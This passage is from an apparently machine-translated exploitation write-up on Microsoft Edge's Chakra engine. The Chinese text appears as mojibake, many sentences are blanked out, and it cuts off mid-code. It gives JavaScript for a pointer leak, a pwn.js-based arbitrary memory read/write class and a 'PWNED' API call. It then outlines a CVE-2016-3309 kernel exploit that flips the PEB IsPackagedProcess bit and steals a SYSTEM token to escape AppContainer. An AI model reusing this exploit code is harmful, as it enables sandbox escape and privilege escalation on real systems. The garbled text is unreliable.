åœ¨æœ¬èŠ‚ä¸­ï¼Œæˆ‘ä»¬è€ƒè™‘ä¸€ç§å…è®¸æ‚¨ä½¿ç”¨<code>OOB</code>è¯»å†™ä»»æ„åœ°å€çš„æŠ€æœ¯ã€‚ æˆ‘ä»¬è·å¾—æ­¤ç»“æœçš„æ–¹æ³•å°†ç±»ä¼¼äºæºä»£ç [1]ä¸­ä½¿ç”¨çš„æ–¹æ³•ï¼Œä½†ä¹Ÿå°†å‘ç”Ÿé‡å¤§å˜åŒ–ã€‚ </p><br><p> åœ¨ä½¿ç”¨çš„<code>Edge</code>ç‰ˆæœ¬ä¸­<code>Edge</code>å †çš„å†…å­˜å—æ˜¯æŒ‰é¡ºåºåˆ†é…çš„ï¼Œå› æ­¤ï¼Œå½“åˆ†é…å¤§é‡ä»»ä½•å¯¹è±¡æ—¶ï¼Œå®ƒä»¬è¿Ÿæ—©ä¼šåœ¨æ•°ç»„æ®µä¹‹åï¼Œæˆ‘ä»¬å¯ä»¥è¶…è¶Šå®ƒã€‚ </p><br><p> é¦–å…ˆï¼Œå®ƒä½¿æˆ‘ä»¬èƒ½å¤Ÿè¯»å–æŒ‡å‘å¯¹è±¡æ–¹æ³•è™šæ‹Ÿè¡¨çš„æŒ‡é’ˆï¼ˆ <code>vftable</code> ï¼‰ï¼Œä»¥ä¾¿æˆ‘ä»¬å¯ä»¥ç»•è¿‡è¿›ç¨‹åœ°å€ç©ºé—´ï¼ˆ <code>ASLR</code> ï¼‰çš„éšæœºåŒ–ã€‚ ä½†æ˜¯è®¿é—®å“ªäº›å¯¹è±¡å°†å¸®åŠ©æˆ‘ä»¬å®ç°ä»»æ„è¯»å†™ï¼Ÿ å‡ ä¸ª<code>DataView</code>å¯¹è±¡å¯¹æ­¤éå¸¸<code>DataView</code> ã€‚ </p><br><blockquote>  DataViewæä¾›äº†ä¸€ä¸ªä½çº§æ¥å£ï¼Œç”¨äºåœ¨äºŒè¿›åˆ¶ArrayBufferä¸­è¯»å–å’Œå†™å…¥å¤šä¸ªæ•°å­—ç±»å‹ï¼Œè€Œä¸å¹³å°å­—èŠ‚é¡ºåºæ— å…³ã€‚ </blockquote><p>  <code>DataView</code>çš„å†…éƒ¨ç»“æ„åŒ…å«ä¸€ä¸ªæŒ‡å‘ç¼“å†²åŒºçš„æŒ‡é’ˆã€‚ ä¾‹å¦‚ï¼Œè¦è¯»å–å’Œå†™å…¥ä»»æ„åœ°å€ï¼Œæˆ‘ä»¬å¯ä»¥æ„å»ºä¸¤ä¸ª<code>DataView</code>é“¾ï¼ˆ <code>dv1</code>å’Œ<code>dv2</code> ï¼‰ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼šä½œä¸º<code>dv1</code>ç¼“å†²åŒº<code>dv1</code>é€šè¿‡è®¿é—®æ•°ç»„æŒ‡å®šåœ°å€<code>dv2</code> ã€‚ ç°åœ¨ä½¿ç”¨<code>dv1</code>æˆ‘ä»¬å¯ä»¥æ›´æ”¹<code>dv2</code>ç¼“å†²åŒºçš„åœ°å€ï¼Œå› æ­¤å¯ä»¥å®ç°ä»»æ„è¯»å†™ã€‚ å¯ä»¥ç”¨ä»¥ä¸‹æ–¹å¼è¡¨ç¤ºï¼š </p><br><p><img src="https://habrastorage.org/webt/ch/9n/do/ch9ndofe4zamumfvihnmv6xtg-o.jpeg" alt="ä»»æ„åœ°å€è¯»/å†™"></p><br><p> è¦ä½¿ç”¨æ­¤æ–¹æ³•ï¼Œæ‚¨éœ€è¦å­¦ä¹ å¦‚ä½•ç¡®å®šå†…å­˜ä¸­å¯¹è±¡çš„åœ°å€ã€‚ ä¸ºæ­¤ï¼Œå­˜åœ¨ä»¥ä¸‹æŠ€æœ¯ï¼šæ‚¨éœ€è¦åˆ›å»ºä¸€ä¸ªæ–°çš„<code>Array</code> ï¼Œä½¿ç”¨<code>OOB</code>ä¿å­˜å…¶<code>typeId</code>å’Œ<code>typeId</code> ï¼ˆç»“æ„çš„å‰ä¸¤ä¸ª64ä½å­—æ®µï¼‰ï¼Œç„¶åå°†åœ°å€æ„Ÿå…´è¶£çš„å¯¹è±¡åˆ†é…ç»™è¯¥æ•°ç»„çš„ç¬¬ä¸€ä¸ªå…ƒç´ ã€‚ ç„¶åï¼Œæ‚¨å¿…é¡»è¿˜åŸå…ˆå‰ä¿å­˜çš„<code>typeId</code>å’Œ<code>typeId</code> ã€‚ ç°åœ¨ï¼Œå¯ä»¥é€šè¿‡å¼•ç”¨æ•°ç»„çš„ç¬¬ä¸€ä¸ªå’Œç¬¬äºŒä¸ªå…ƒç´ æ¥è·å¾—å¯¹è±¡åœ°å€çš„åˆçº§å’Œé«˜çº§åŒå­—ã€‚ äº‹å®æ˜¯ï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼Œæ–°æ•°ç»„ä¸º<code>IntArray</code> ï¼Œå¹¶ä¸”è¯¥æ•°ç»„çš„4å­—èŠ‚å€¼æŒ‰åŸæ ·å­˜å‚¨åœ¨å…¶æ®µä¸­ã€‚ åœ¨å°†å¯¹è±¡åˆ†é…ç»™æ•°ç»„æ—¶ï¼Œè¯¥æ•°ç»„å°†è½¬æ¢ä¸º<code>ObjectArray</code> ï¼Œå…¶æ®µç”¨äºå­˜å‚¨å¯¹è±¡çš„åœ°å€ã€‚ è½¬æ¢æ›´æ”¹äº†<code>typeId</code>å’Œ<code>typeId</code> ã€‚ å› æ­¤ï¼Œå¦‚æœæˆ‘ä»¬é€šè¿‡è¯¥æ•°ç»„çš„å…ƒç´ æ¢å¤åŸå§‹å€¼<code>typeId</code>å’Œ<code>typeId</code> ï¼Œåˆ™å¯ä»¥ç›´æ¥è®¿é—®è¯¥æ®µã€‚ ç¤ºæ„æ€§æè¿°çš„è¿‡ç¨‹å¯ä»¥è¡¨ç¤ºå¦‚ä¸‹ï¼š </p><br><p><img src="https://habrastorage.org/webt/un/np/-z/unnp-zlvr6ql9m5_f9rmxrdwt20.jpeg" alt="æŒ‡é’ˆæ³„æ¼"></p><br><p> è·å–åœ°å€çš„å‡½æ•°å°†å¦‚ä¸‹æ‰€ç¤ºï¼š </p><br><pre> <code class="javascript hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">addressOf</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">obj</span></span></span><span class="hljs-function">) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> hdr_backup = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> <span class="hljs-built_in"><span class="hljs-built_in">Array</span></span>(<span class="hljs-number"><span class="hljs-number">4</span></span>); <span class="hljs-comment"><span class="hljs-comment">//  vftable  typeId intarr_object for(var i = 0; i &lt; 4; i++) hdr_backup[i] = arr_get(intarr_idx + i); intarr_object[0] = obj; //  vftable  typeId intarr_object for(var i = 0; i &lt; 4; i++) arr_set(intarr_idx + i, hdr_backup[i]); //         return [intarr_object[0], intarr_object[1]]; }</span></span></code> </pre> <br><p> ä¸€ä¸ªå°šå¾…è§£å†³çš„é—®é¢˜ä»ç„¶æ˜¯å¿…è¦å¯¹è±¡çš„åˆ›å»ºä»¥åŠä½¿ç”¨<code>OOB</code>è¿›è¡Œæœç´¢ã€‚ å¦‚å‰æ‰€è¿°ï¼Œå½“åˆ†é…å¤§é‡å¯¹è±¡æ—¶ï¼Œå®ƒä»¬è¿Ÿæ—©ä¼šåœ¨æ•°ç»„æ®µä¹‹åè„±é¢–è€Œå‡ºï¼Œæˆ‘ä»¬å¯ä»¥è¶…è¶Šå®ƒä»¬ã€‚ è¦æ‰¾åˆ°å¿…è¦çš„å¯¹è±¡ï¼Œæ‚¨åªéœ€è¦éå†æ•°ç»„å¤–éƒ¨çš„ç´¢å¼•ä»¥å¯»æ‰¾å¿…è¦çš„å¯¹è±¡ã€‚ å› ä¸º æ‰€æœ‰ç›¸åŒç±»å‹çš„å¯¹è±¡éƒ½ä½äºå †çš„ä¸€ä¸ªæ®µä¸­ï¼Œæ‚¨å¯ä»¥ä¼˜åŒ–æœç´¢å¹¶ä»¥<code>0x10000</code>å¢é‡éå†å †çš„å„ä¸ªæ®µï¼Œå¹¶ä»…æ£€æŸ¥å †æ¯ä¸ªæ®µå¼€å¤´çš„å‰å‡ ä¸ªå€¼ã€‚ ä¸ºäº†è¯†åˆ«å¯¹è±¡ï¼Œå¯ä»¥ä¸ºæŸäº›å‚æ•°ä¸ºå…¶è®¾ç½®å”¯ä¸€å€¼ï¼ˆä¾‹å¦‚ï¼Œå¯¹äº<code>DataView</code>å¯ä»¥ä¸º<code>byteOffset</code> ï¼‰ï¼Œæˆ–è€…ä½¿ç”¨å¯¹è±¡ç»“æ„ä¸­çš„å·²çŸ¥å¸¸é‡ï¼ˆä¾‹å¦‚ï¼Œåœ¨ä½¿ç”¨çš„<code>Edge</code>ä¸­çš„<code>IntArray</code>ç‰ˆæœ¬ä¸­ï¼Œå€¼<code>0x10005</code>å§‹ç»ˆä½äº<code>0x18</code> ï¼‰ã€‚ </p><br><p> é€šè¿‡ç»“åˆä»¥ä¸Šæ‰€æœ‰æŠ€æœ¯ï¼Œæ‚¨å¯ä»¥å¯¹ä»»æ„åœ°å€è¿›è¡Œè¯»å†™ã€‚ ä¸‹é¢æ˜¯è¯»å–<code>DataView</code>å†…å­˜å¯¹è±¡çš„å±å¹•æˆªå›¾ã€‚ </p><br><p><img src="https://habrastorage.org/webt/fe/i5/o3/fei5o3k0zh3pogdmb5diifeick8.png" alt="å†…å­˜æ³„æ¼"></p><br><h2 id="shag-2-vypolnenie-proizvolnyh-funkciy-api"> æ­¥éª¤2.æ‰§è¡Œä»»æ„APIå‡½æ•° </h2><br><p> åœ¨æ­¤é˜¶æ®µï¼Œæˆ‘ä»¬èƒ½å¤Ÿåœ¨æ˜¾ç¤º<code>Edge</code>å†…å®¹çš„è¿‡ç¨‹ä¸­è¯»å†™ä»»æ„åœ°å€ã€‚ è€ƒè™‘åº”è¯¥å¹²æ‰°åº”ç”¨ç¨‹åºè¿›ä¸€æ­¥æ“ä½œçš„ä¸»è¦æŠ€æœ¯åŠå…¶è§£å†³æ–¹æ³•ã€‚ æˆ‘ä»¬å·²ç»å†™äº†å‡ ç¯‡ç®€çŸ­çš„æ–‡ç« ç³»åˆ—ï¼Œä»‹ç»äº†<code>  app specific security mitigation</code> ï¼ˆ <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">ç¬¬1éƒ¨åˆ†ï¼Œç®€ä»‹</a> ï¼Œ <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">ç¬¬2éƒ¨åˆ†ï¼ŒInternet Explorerå’ŒEdge</a> ï¼Œ <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">ç¬¬3éƒ¨åˆ†ï¼ŒGoogle Chrome</a> ï¼‰ï¼Œä½†æ˜¯è¯·è®°ä½ï¼Œå¼€å‘äººå‘˜ä¸ä¼šåœæ»ä¸å‰å¹¶å‘å…¶äº§å“æ·»åŠ æ–°å·¥å…·ä¿æŠ¤ã€‚ </p><br><h3 id="randomizaciya-adresnogo-prostranstva-aslr"> åœ°å€ç©ºé—´éšæœºåŒ–ï¼ˆ <code>ASLR</code> ï¼‰ </h3><br><blockquote>  ASLRï¼ˆè‹±è¯­åœ°å€ç©ºé—´å¸ƒå±€éšæœºåŒ–ï¼‰æ˜¯ä¸€ç§åœ¨æ“ä½œç³»ç»Ÿä¸­ä½¿ç”¨çš„æŠ€æœ¯ï¼Œå®ƒä¼šéšæœºæ›´æ”¹è¿›ç¨‹åœ°å€ç©ºé—´ä¸­é‡è¦æ•°æ®ç»“æ„çš„ä½ç½®ï¼Œå³ï¼šå¯æ‰§è¡Œæ–‡ä»¶æ˜ åƒï¼Œå·²åŠ è½½çš„åº“ï¼Œå †å’Œå †æ ˆã€‚ </blockquote><p> ä¸Šé¢ï¼Œæˆ‘ä»¬å­¦ä¼šäº†è¯»å–è™šæ‹Ÿç±»è¡¨çš„åœ°å€ï¼Œä½¿ç”¨å®ƒä»¬ï¼Œæˆ‘ä»¬å¯ä»¥è½»æ¾åœ°è®¡ç®—<code>Chakra.dll</code>æ¨¡å—çš„åŸºåœ°å€ï¼Œå› æ­¤<code>ASLR</code>ä¸ä¼šå‡ºç°è¿›ä¸€æ­¥æ“ä½œçš„é—®é¢˜ã€‚ </p><br><h3 id="data-execution-protection-dep-nx"> æ•°æ®æ‰§è¡Œä¿æŠ¤ï¼ˆ <code>DEP</code> ï¼Œ <code>NX</code> ï¼‰ </h3><br><blockquote> æ•°æ®æ‰§è¡Œä¿æŠ¤ï¼ˆDEPï¼‰æ˜¯Linuxï¼ŒMac OS Xï¼ŒAndroidå’ŒWindowså†…ç½®çš„ä¸€é¡¹å®‰å…¨åŠŸèƒ½ï¼Œå¯é˜²æ­¢åº”ç”¨ç¨‹åºä»æ ‡è®°ä¸ºâ€œä»…æ•°æ®â€çš„å†…å­˜åŒºåŸŸæ‰§è¡Œä»£ç ã€‚ å®ƒå°†é˜²æ­¢æŸäº›æ”»å‡»ï¼Œä¾‹å¦‚ï¼Œä½¿ç”¨ç¼“å†²åŒºæº¢å‡ºå°†ä»£ç ä¿å­˜åœ¨æ­¤ç±»åŒºåŸŸä¸­ã€‚ </blockquote><p> è§£å†³æ­¤é—®é¢˜çš„ä¸€ç§æ–¹æ³•æ˜¯ä½¿ç”¨<code>ROP</code>é“¾è°ƒç”¨<code>VirtualAlloc</code> ã€‚ ä½†æ˜¯åœ¨<code>Edge</code>çš„æƒ…å†µä¸‹ï¼Œç”±äºä½¿ç”¨<code>ACG</code> <code>Edge</code>æ­¤æ–¹æ³•å°†ä¸èµ·ä½œç”¨ï¼ˆè¯·å‚è§ä¸‹æ–‡ï¼‰ã€‚ </p><br><h3 id="control-flow-guard-cfg"> æ§åˆ¶æµé˜²æŠ¤ï¼ˆ <code>CFG</code> ï¼‰ </h3><br><blockquote>  <code>CFG</code>æ˜¯ä¸€ç§ä¿æŠ¤æœºåˆ¶ï¼Œæ—¨åœ¨ä½¿åˆ©ç”¨ç”¨æˆ·å’Œå†…æ ¸æ¨¡å¼åº”ç”¨ç¨‹åºä¸­çš„äºŒè¿›åˆ¶æ¼æ´çš„è¿‡ç¨‹å˜å¾—å¤æ‚ã€‚ è¯¥æœºåˆ¶çš„å·¥ä½œåœ¨äºéªŒè¯é—´æ¥è°ƒç”¨ï¼Œä»è€Œé˜²æ­¢æ”»å‡»è€…æ‹¦æˆªæ‰§è¡Œçº¿ç¨‹ï¼ˆä¾‹å¦‚ï¼Œé€šè¿‡è¦†ç›–è™šæ‹Ÿå‡½æ•°è¡¨ï¼‰ã€‚ </blockquote><p> è¯¥æŠ€æœ¯ä»…æ§åˆ¶é—´æ¥è°ƒç”¨ï¼Œä¾‹å¦‚ï¼Œæ¥è‡ªå¯¹è±¡å‡½æ•°è™šæ‹Ÿè¡¨çš„æ–¹æ³•è°ƒç”¨ã€‚ å †æ ˆä¸Šçš„è¿”å›åœ°å€ä¸å—æ§åˆ¶ï¼Œå¯ç”¨äºæ„å»º<code>ROP</code>é“¾ã€‚  <code>Intel</code>æ–°æŠ€æœ¯ï¼š <code>Control-flow Enforcement Technology</code> ï¼ˆ <code>CET</code> ï¼‰å¯èƒ½ä¼šé˜»ç¢<code>ROP/JOP/COP</code>é“¾çš„æœªæ¥ä½¿ç”¨ã€‚ è¯¥æŠ€æœ¯åŒ…æ‹¬ä¸¤ä¸ªéƒ¨åˆ†ï¼š </p><br><ol><li>  <code>Shadow Stack</code> ï¼ˆå½±å­å †æ ˆï¼‰-ç”¨äºæ§åˆ¶è¿”å›åœ°å€å¹¶é˜²æ­¢<code>ROP</code>é“¾ï¼› </li><li>  <code>Indirect Branch Tracking</code>æ˜¯ä¸€ç§é˜²èŒƒ<code>JOP/COP</code>é“¾çš„æ–¹æ³•ã€‚ è¿™æ˜¯ä¸€æ¡æ–°çš„<code>ENDBRANCH</code>æŒ‡ä»¤ï¼Œå®ƒæ ‡è®°äº†<code>call</code>å’Œ<code>jmp</code>æŒ‡ä»¤çš„æ‰€æœ‰æœ‰æ•ˆè½¬æ¢åœ°å€ã€‚ </li></ol><br><h3 id="arbitrary-code-guard-acg"> ä»»æ„ä»£ç ä¿æŠ¤ï¼ˆ <code>ACG</code> ï¼‰ </h3><br><blockquote>  <code>ACG</code>æ˜¯ä¸€ç§é˜²æ­¢åŠ¨æ€ä»£ç ç”Ÿæˆï¼ˆç¦æ­¢ä½¿ç”¨<code>VirtaulAlloc</code>åˆ†é…å†…å­˜çš„<code>rwx</code>åŒºåŸŸï¼‰åŠå…¶ä¿®æ”¹ï¼ˆæ— æ³•å°†ç°æœ‰å†…å­˜åŒºåŸŸ<code>VirtaulAlloc</code>ä¸ºå¯æ‰§è¡Œæ–‡ä»¶ï¼‰çš„æŠ€æœ¯ã€‚ </blockquote><p> åƒ<code>CFG</code>ä¸€æ ·ï¼Œè¿™ç§ä¿æŠ¤ä¸ä¼šé˜»æ­¢<code>ROP</code>é“¾çš„ä½¿ç”¨ã€‚ </p><br><h3 id="appcontainer-isolation">  AppContaineréš”ç¦» </h3><br><blockquote>  AppContaineræ˜¯ä¸€é¡¹MicrosoftæŠ€æœ¯ï¼Œå¯è®©æ‚¨é€šè¿‡åœ¨æ²™ç›’ç¯å¢ƒä¸­è¿è¡Œè¯¥è¿›ç¨‹æ¥éš”ç¦»è¯¥è¿›ç¨‹ã€‚ è¯¥æŠ€æœ¯å°†è¿›ç¨‹çš„è®¿é—®é™åˆ¶åœ¨å‡­æ®ï¼Œè®¾å¤‡ï¼Œæ–‡ä»¶ç³»ç»Ÿï¼Œç½‘ç»œï¼Œå…¶ä»–è¿›ç¨‹å’Œçª—å£ä¸­ï¼Œæ—¨åœ¨æœ€å¤§ç¨‹åº¦åœ°é™ä½æ¶æ„è½¯ä»¶çš„èƒ½åŠ›ï¼Œè¯¥æ¶æ„è½¯ä»¶å…·æœ‰åœ¨è¿›ç¨‹ä¸­æ‰§è¡Œä»»æ„ä»£ç çš„èƒ½åŠ›ã€‚ </blockquote><p> è¿™ç§ä¿æŠ¤æå¤§åœ°ä½¿æ“ä½œè¿‡ç¨‹å¤æ‚åŒ–ã€‚ å› æ­¤ï¼Œæˆ‘ä»¬æ— æ³•è°ƒç”¨ç¬¬ä¸‰æ–¹å¯æ‰§è¡Œæ–‡ä»¶æˆ–è®¿é—®å†…å­˜æˆ–ç£ç›˜ä¸­çš„æ•æ„Ÿç”¨æˆ·ä¿¡æ¯ã€‚ ä½†æ˜¯ï¼Œå¯ä»¥é€šè¿‡åœ¨AppContaineræ²™ç®±çš„å®ç°ä¸­ä½¿ç”¨æ¼æ´æˆ–é€šè¿‡åˆ©ç”¨OSå†…æ ¸ä¸­çš„æ¼æ´æ¥å¢åŠ ç‰¹æƒæ¥å…‹æœè¿™ç§ä¿æŠ¤ã€‚ </p><br><p> å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œ <code>Microsoft</code>æœ‰å•ç‹¬çš„<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">å¥–åŠ±è®¡åˆ’</a> ï¼Œç”¨äºè§„é¿<code>security mitigation</code>æŠ€æœ¯çš„æŠ€æœ¯ã€‚ è¯¥ç¨‹åºè¡¨æ˜é‡ç”¨å¯æ‰§è¡Œä»£ç ï¼ˆæ„å»º<code>ROP</code>é“¾æ˜¯è¯¥æŠ€æœ¯çš„ä¸€ç§å˜ä½“ï¼‰ä¸å±äºè¯¥ç¨‹åºçš„èŒƒå›´ï¼Œå› ä¸º æ˜¯ä¸€ä¸ªæ¶æ„é—®é¢˜ã€‚ </p><br><h3 id="ispolzovanie-pwnjs"> ä½¿ç”¨pwn.js </h3><br><p> ä»å¯¹æ‰€æœ‰å®‰å…¨æŠ€æœ¯çš„åˆ†ææ¥çœ‹ï¼Œä¸ºäº†èƒ½å¤Ÿæ‰§è¡Œä»»æ„ä»£ç ï¼Œæ‚¨éœ€è¦ç»•è¿‡<code>AppContainer</code>æ²™ç®±ã€‚ åœ¨æœ¬æ–‡ä¸­ï¼Œæˆ‘ä»¬æè¿°äº†ä¸€ç§ä½¿ç”¨<code>Windows</code>å†…æ ¸ä¸­çš„æ¼æ´çš„æ–¹æ³•ã€‚ åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬åªèƒ½ä½¿ç”¨<code>JS</code>ä»£ç å’Œ<code>ROP</code>é“¾ã€‚ ä»…ä½¿ç”¨<code>ROP</code>é“¾ä¸ºå†…æ ¸ç¼–å†™æ¼æ´åˆ©ç”¨ç¨‹åºå¯èƒ½éå¸¸å›°éš¾ã€‚ ä¸ºäº†ç®€åŒ–æ­¤ä»»åŠ¡ï¼Œæ‚¨å¯ä»¥æ‰¾åˆ°ä¸€ç»„å°å·¥å…·ï¼Œç”¨å®ƒä»¬æˆ‘ä»¬å¯ä»¥è°ƒç”¨å¿…è¦çš„<code>WinAPI</code>æ–¹æ³•ã€‚ å¹¸è¿çš„æ˜¯ï¼Œè¿™å·²ç»åœ¨<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u="><code>pwn.js</code></a>åº“ä¸­å®ç°äº†ã€‚ ä½¿ç”¨å®ƒï¼Œä»…æè¿°äº†ç”¨äºä»»æ„è¯»å†™çš„<code>write</code>åŠŸèƒ½ï¼Œæ‚¨å¯ä»¥è·å¾—ä¸€ä¸ªä¾¿æ·çš„<code>API</code>ç”¨äºæŸ¥æ‰¾å¿…è¦çš„<code>WinAPI</code>å‡½æ•°å¹¶å¯¹å…¶è¿›è¡Œè°ƒç”¨ã€‚  <code>pwn.js</code>è¿˜æä¾›äº†ç”¨äºå¤„ç†64ä½å€¼å’ŒæŒ‡é’ˆçš„ä¾¿æ·å·¥å…·ï¼Œä»¥åŠç”¨äºå¤„ç†ç»“æ„çš„å·¥å…·ã€‚ </p><br><p> è€ƒè™‘ä¸€ä¸ªç®€å•çš„ä¾‹å­ã€‚ åœ¨ä¸Šä¸€æ­¥ä¸­ï¼Œæˆ‘ä»¬è·å¾—äº†ä¸¤ä¸ªç›¸å…³çš„<code>DataView</code>é“¾ã€‚ è¦å‡†å¤‡åˆ©ç”¨ï¼Œå¿…é¡»åˆ›å»ºä»¥ä¸‹ç±»ï¼š </p><br><pre> <code class="javascript hljs"><span class="hljs-keyword"><span class="hljs-keyword">var</span></span> Exploit = (<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> ChakraExploit = pwnjs.ChakraExploit; <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> Integer = pwnjs.Integer; <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">Exploit</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{ ChakraExploit.call(<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>); ... <span class="hljs-comment"><span class="hljs-comment">//  arbitrary address read/write    ... // DataView,         this.dv = ...; // DataView,     this.dv this.dv_offset = ...; //    Chakra.dll, ,     var vtable = ...; this.initChakra(vtable); } Exploit.prototype = Object.create(ChakraExploit.prototype); Exploit.prototype.constructor = Exploit; Exploit.prototype.set_dv_address = function(lo, hi) { this.dv_offset.setInt32(0x38, lo, true); this.dv_offset.setInt32(0x3c, hi, true); } Exploit.prototype.read = function (address, size) { this.set_dv_address(address.low, address.high); switch (size) { case 8: return new Integer(this.dv.getInt8(0, true), 0, true); case 16: return new Integer(this.dv.getInt16(0, true), 0, true); case 32: return new Integer(this.dv.getInt32(0, true), 0, true); case 64: return new Integer(this.dv.getInt32(0, true), this.dv.getInt32(4, true), true); } } Exploit.prototype.write = function (address, value, size) { this.set_dv_address(address.low, address.high); switch (size) { case 8: this.dv.setInt8(0, value.low, true); break; case 16: this.dv.setInt16(0, value.low, true); break; case 32: this.dv.setInt32(0, value.low, true); break; case 64: this.dv.setInt32(0, value.low, true); this.dv.setInt32(4, value.high, true); break; } } return Exploit; })();</span></span></code> </pre> <br><p>     ,      <code>MessageBoxA</code> : </p><br><pre> <code class="javascript hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">run</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">with</span></span> (<span class="hljs-keyword"><span class="hljs-keyword">new</span></span> Exploit()) { <span class="hljs-comment"><span class="hljs-comment">//alert('Chakra: ' + chakraBase.toString(16)); var MessageBoxA = importFunction('user32.dll', 'MessageBoxA', Int32); var GetActiveWindow = importFunction('user32.dll', 'GetActiveWindow', Int64); var hwnd = GetActiveWindow(); var ret = MessageBoxA(hwnd, new CString('PWNED'), new CString('PWNED'), 0); } }</span></span></code> </pre> <br><p>      : </p><br><p><img src="https://habrastorage.org/webt/vm/zb/t1/vmzbt1z0du0bnjto8mxpwzo9hac.png" alt="é“ºå¥½çš„"></p><br><h2 id="shag-3-povyshenie-privilegiy-i-vyhod-iz-pesochnicy-s-pomoschyu-uyazvimosti-yadra">  3.           </h2><br><p>         <code>WinAPI</code> .         .      <code>CVE-2016-3309</code> .         [7]  [8],     <code>pwn.js</code> [2]    ,        <code>GDI</code> -.         [9], [10]  [11].              .        ,      .       ,                <code>AppContainer</code> ,          <code>pwn.js</code> .           <code>cmd.exe</code>    <code>SYSTEM</code> . </p><br><blockquote> GDI â€”   Windows          , ,    . </blockquote><p> ,             . <code>JS</code> -     64-     <code>kernel_read_64</code>  <code>kernel_write_64</code> , .        Windows.           <code>BITMAP</code> ,    . <code>pwn.js</code>     .  <code>BITMAP</code>  , , : </p><br><pre> <code class="javascript hljs"><span class="hljs-keyword"><span class="hljs-keyword">var</span></span> BITMAP = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> StructType([ [<span class="hljs-string"><span class="hljs-string">'poolHeader'</span></span>, <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> ArrayType(Uint32, <span class="hljs-number"><span class="hljs-number">4</span></span>)], <span class="hljs-comment"><span class="hljs-comment">// BASEOBJECT64 ['hHmgr', Uint64], ['ulShareCount', Uint32], ['cExclusiveLock', Uint16], ['BaseFlags', Uint16], ['Tid', Uint64], ['dhsurf', Uint64], ['hsurf', Uint64], ['dhpdev', Uint64], ['hdev', Uint64], ['sizlBitmap', SIZEL], ['cjBits', Uint32], ['pvBits', Uint64], ['pvScan0', Uint64], ]);</span></span></code> </pre> <br><p>  <code>Tid</code>       <code>KTHREAD</code>     , ,   ,   <code>EmpCheckErrataList</code> ,        .  ,        : </p><br><pre> <code class="javascript hljs">... var nt_EmpCheckErrataList_ptr = worker_bitmap_obj.Tid.add(<span class="hljs-number"><span class="hljs-number">0x2a8</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> nt_EmpCheckErrataList = kernel_read_64(nt_EmpCheckErrataList_ptr); <span class="hljs-comment"><span class="hljs-comment">/* g_config   ,         empCheckErrataList  WinDbg        : ? nt!EmpCheckErrataList - nt */</span></span> <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> ntoskrnl_base_address = nt_EmpCheckErrataList.sub( g_config.nt_empCheckErrataList_offset); ...</code> </pre> <br><p>    ,     <code>AppContainer</code>    .    <code>AppContainer</code>    <code>IsPackagedProcess</code>     ( <code>Process Environment Block</code> , <code>PEB</code> ),         .    <code>Access Token</code> ,         <code>AppContainer</code> .       <code>Access Token</code>  ,         . <code>Access Token</code>     ,     .     <code>EPROCESS</code>    <code>ActiveProcessLinks</code> ,       .   <code>PEB</code>     <code>EPROCESS</code> .          <code>PsInitialSystemProcess</code> ,   ,         <code>ActiveProcessLinks</code> . </p><br><p>    <code>Edge</code>    :      ,    <code>Edge</code>       .              <code>SYSTEM</code> .   , , <code>winlogon.exe</code> . </p><br><p>        <code>pwn.js</code>  : </p><br><pre> <code class="javascript hljs"><span class="hljs-comment"><span class="hljs-comment">//  PEB   var pinfo = _PROCESS_BASIC_INFORMATION.Ptr.cast(malloc(_PROCESS_BASIC_INFORMATION.size)); var pinfo_sz = Uint64.Ptr.cast(malloc(8)); NtQueryInformationProcess(GetCurrentProcess(), 0, pinfo, _PROCESS_BASIC_INFORMATION.size, pinfo_sz); var peb = pinfo.PebBaseAddress; /*    IsPackagedProcess       peb   char * */ var bit_field = peb[3]; bit_field = bit_field.xor(1 &lt;&lt; 4); peb[3] = bit_field; /*             WinDbg    .     : dt ntdll!_EPROCESS uniqueprocessid token activeprocesslinks           */ var ActiveProcessLinks = system_eprocess.add( g_config.ActiveProcessLinksOffset); var current_pid = GetCurrentProcessId(); var current_eprocess = null; var 